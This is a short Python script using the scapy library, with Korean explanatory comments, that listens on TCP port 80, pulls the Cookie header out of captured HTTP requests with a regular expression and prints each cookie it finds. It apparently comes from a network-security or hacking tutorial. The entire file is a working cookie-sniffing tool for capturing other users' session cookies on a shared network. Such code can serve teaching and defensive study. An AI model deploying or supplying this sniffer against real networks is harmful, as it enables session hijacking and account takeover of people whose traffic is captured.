from scapy.all import *
import re    # 파이썬에서 정규식을 찾기 위한 모듈

def cookieSniffer(packet):
    tcp = packet.getlayer('TCP')
    cookie = re.search(r'Cookie: (.+)', str(tcp.payload))
    #정규식 r'Cookie:(.+)'는 'Cookie:문자열' 과 동일한 패턴을 찾기 위한 것이다. 
    if cookie:
        print('---COOKIE SNIFFED\n [%s]' %cookie.group())
        
def main():
    print('+++START SNIFFING COOKIE')
    sniff(filter = 'tcp port 80', store = 0, prn=cookieSniffer)
    #TCP포트 80번으로 전달되는 패킷에서 TCP payload인 HTTP 요청 메시지를 추출하고, 파이썬 정규식을 이용해 Cookie 헤더를 탐색하고, 찾게되면 그 문자열을 화면에 출력
    
if __name__ == '__main__':
    main()